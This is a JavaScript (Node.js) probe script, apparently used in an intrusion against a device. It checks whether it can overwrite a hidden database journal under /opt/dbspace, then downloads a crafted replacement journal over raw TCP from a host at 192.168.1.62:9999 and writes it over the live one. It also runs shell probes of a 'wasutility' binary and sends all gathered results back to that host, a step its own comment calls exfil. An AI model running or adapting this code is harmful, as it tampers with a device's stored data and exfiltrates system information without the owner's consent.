"use strict";
/* p41: OVERWRITE placement of hot journal (existing file, no create)
   1. journal file owner/perm (ls -la, stat)
   2. overwrite test: open r+, read 16B, write back at 0, close
   3. if OK: download journal (raw TCP GET), open 'w+' (truncate), write all, readback md5
   4. wasutility probes (no timeout cmd)
   exfil /p41info
*/
var fs = null, cp = null, net = null, crypto = null;
try { fs = require('fs'); } catch (e) {}
try { cp = require('child_process'); } catch (e) {}
try { net = require('net'); } catch (e) {}
try { crypto = require('crypto'); } catch (e) {}

var HOST = '192.168.1.62';
var PORT = 9999;
var R = { ts: new Date().toISOString(), probe: 'p41', results: {}, log: [] };
var posted = false;

function L(s) { R.log.push(String(s).substring(0, 500)); }

function postBuf(path, buf) {
  var hdr = 'POST ' + path + ' HTTP/1.1\r\nHost: ' + HOST + ':9999\r\nContent-Type: application/octet-stream\r\nContent-Length: ' + buf.length + '\r\nConnection: close\r\n\r\n';
  try {
    var s = net.connect(PORT, HOST);
    s.setTimeout(60000, function () { s.destroy(); });
    s.on('connect', function () {
      s.write(hdr);
      var off = 0;
      var iv = setInterval(function () {
        if (off >= buf.length) { clearInterval(iv); setTimeout(function () { s.destroy(); }, 3000); return; }
        s.write(buf.slice(off, off + 65536));
        off += 65536;
      }, 50);
      setTimeout(function () { s.destroy(); }, 120000);
    });
    s.on('error', function (e) { L('postBuf err ' + e.message); });
  } catch (e) { L('postBuf ctor ' + e); }
}

function postFinal() {
  if (posted) return;
  posted = true;
  postBuf('/p41info', new Buffer(JSON.stringify(R), 'utf8'));
}

function run(cmd, timeoutMs) {
  timeoutMs = timeoutMs || 20000;
  return new Promise(function (resolve) {
    if (!cp) { resolve('[no child_process]'); return; }
    var out = '', err = '', done = false;
    var child;
    try { child = cp.spawn('sh', ['-c', cmd], { stdio: ['ignore', 'pipe', 'pipe'] }); }
    catch (e) { resolve('[spawn err ' + e + ']'); return; }
    var t = setTimeout(function () {
      if (done) return; done = true;
      try { child.kill('SIGKILL'); } catch (e) {}
      resolve('[timeout ' + timeoutMs + '] ' + (out || err).substring(0, 8000));
    }, timeoutMs);
    child.stdout.on('data', function (d) { out += d.toString(); });
    child.stderr.on('data', function (d) { err += d.toString(); });
    child.on('close', function (code) {
      if (done) return; done = true; clearTimeout(t);
      var s = (out || err);
      if (code !== 0) s = '[exit ' + code + '] ' + s;
      resolve(s.substring(0, 9000));
    });
    child.on('error', function (e) {
      if (done) return; done = true; clearTimeout(t);
      resolve('[err ' + e.message + ']');
    });
  });
}

function seq(steps) {
  var i = 0;
  function next() {
    if (i >= steps.length) { postFinal(); return; }
    var s = steps[i++];
    s.fn().then(function (r) {
      R.results[s.name] = r;
      next();
    }).catch(function (e) {
      R.results[s.name] = '[exception ' + e + ']';
      next();
    });
  }
  next();
}

function md5Buf(b) { return crypto.createHash('md5').update(b).digest('hex'); }

function httpGetBody(path) {
  return new Promise(function (resolve, reject) {
    var sock;
    try { sock = net.connect(PORT, HOST); } catch (e) { reject(String(e)); return; }
    sock.setTimeout(45000, function () { try { sock.destroy(); } catch (e) {} reject('socket timeout'); });
    var state = 'head';
    var headBuf = '';
    var need = -1;
    var chunks = [];
    var bodyLen = 0;
    sock.on('connect', function () {
      sock.write('GET ' + path + ' HTTP/1.1\r\nHost: ' + HOST + ':9999\r\nConnection: close\r\n\r\n');
    });
    sock.on('data', function (d) {
      var data = new Buffer(d, 'binary');
      if (state === 'head') {
        headBuf += data.toString('binary');
        var idx = headBuf.indexOf('\r\n\r\n');
        if (idx < 0) return;
        var head = headBuf.substring(0, idx);
        var m = head.match(/Content-Length:\s*(\d+)/i);
        need = m ? parseInt(m[1], 10) : -1;
        if (need < 0) { reject('no content-length in: ' + head.substring(0, 200)); try { sock.destroy(); } catch (e) {} return; }
        state = 'body';
        data = new Buffer(headBuf.substring(idx + 4), 'binary');
        headBuf = '';
      }
      if (state === 'body') {
        if (data.length) { chunks.push(data); bodyLen += data.length; }
        if (need > 0 && bodyLen >= need) {
          var full = Buffer.concat(chunks);
          if (full.length > need) full = full.slice(0, need);
          try { sock.destroy(); } catch (e) {}
          resolve(full);
        }
      }
    });
    sock.on('error', function (e) { reject('sock err: ' + e.message); });
    sock.on('close', function () {
      if (state === 'head') reject('closed during head');
      else if (chunks.length === 0) reject('closed, 0 body bytes');
    });
  });
}

var JPATH = '/opt/dbspace/.app-context.db-journal';
var LPATH = '/opt/dbspace/.app-context.db';
var EXPECTED_MD5 = '03683f81d337ce2224df6010456738e9';
var EXPECTED_SIZE = 49760;

var steps = [
  { name: 'journal_perm', fn: function () {
      return run('ls -la /opt/dbspace/ 2>/dev/null | grep -E "app-context|total|dbspace"; echo ===; ls -la /opt/ 2>/dev/null | grep -E "dbspace"; echo ===; stat /opt/dbspace/.app-context.db-journal 2>&1 | head -8; echo ===; stat /opt/dbspace 2>&1 | head -8', 15000);
  }},
  { name: 'overwrite_test', fn: function () {
      return new Promise(function (resolve) {
        var out = '';
        try {
          var fd = fs.openSync(JPATH, 'r+');
          var head = Buffer.alloc ? null : null;
          var headbuf = new Buffer(16);
          var nr = fs.readSync(fd, headbuf, 0, 16, 0);
          out = 'opened r+, read ' + nr + 'B: ';
          out += headbuf.toString('hex');
          var nw = fs.writeSync(fd, headbuf, 0, nr, 0);
          out += ' | wrote back ' + nw + 'B';
          fs.closeSync(fd);
          out += ' | CLOSE OK — OVERWRITE PERMITTED';
        } catch (e) { out = 'FAIL ' + String(e); }
        resolve(out);
      });
  }},
  { name: 'placement', fn: function () {
      if (String(R.results.overwrite_test || '').indexOf('PERMITTED') < 0) {
        R.results.placement = 'SKIPPED (overwrite not permitted)';
        return Promise.resolve(null);
      }
      R.results.placement = 'downloading';
      return httpGetBody('/.app-context.db-journal').then(function (buf) {
        R.results.dl_size = buf.length;
        R.results.dl_md5 = md5Buf(buf);
        if (buf.length !== EXPECTED_SIZE) { R.results.placement = 'SIZE MISMATCH got ' + buf.length; return null; }
        if (md5Buf(buf) !== EXPECTED_MD5) { R.results.placement = 'MD5 MISMATCH ' + md5Buf(buf); return null; }
        var fd = fs.openSync(JPATH, 'w+');
        var off = 0;
        while (off < buf.length) {
          var n = fs.writeSync(fd, buf, off, buf.length - off, off);
          off += n;
        }
        fs.closeSync(fd);
        var final = fs.readFileSync(JPATH);
        R.results.journal_after = { size: final.length, md5: md5Buf(final) };
        R.results.journal_ok = (final.length === EXPECTED_SIZE && md5Buf(final) === EXPECTED_MD5);
        R.results.placement = 'PLACED';
        L('placement done journal_ok=' + R.results.journal_ok);
        return null;
      }).catch(function (e) {
        R.results.placement = 'FAIL ' + String(e);
        return null;
      });
  }},
  { name: 'dbspace_after', fn: function () {
      return run('ls -la /opt/dbspace/ 2>/dev/null | grep -E "app-context" | head -10', 15000);
  }},
  { name: 'wasutility_probe', fn: function () {
      return run('/usr/bin/wasutility 2>&1 | head -40; echo "[exit $?]"; echo ===V; /usr/bin/wasutility v 2>&1 | head -20; echo "[exit $?]"; echo ===A; /usr/bin/wasutility a 2>&1 | head -30; echo "[exit $?]"; echo ===D; /usr/bin/wasutility d 2>&1 | head -30; echo "[exit $?]"; echo ===G; /usr/bin/wasutility g 2>&1 | head -20; echo "[exit $?]"; echo ===F; /usr/bin/wasutility f 2>&1 | head -20; echo "[exit $?]"', 60000);
  }},
  { name: 'live_db_state', fn: function () {
      return new Promise(function (resolve) {
        try {
          var b = fs.readFileSync(LPATH);
          resolve('size=' + b.length + ' md5=' + md5Buf(b));
        } catch (e) { resolve('read err ' + String(e)); }
      });
  }}
];

seq(steps);

setTimeout(function () { R.results.guard = 'global timeout'; postFinal(); }, 180000);
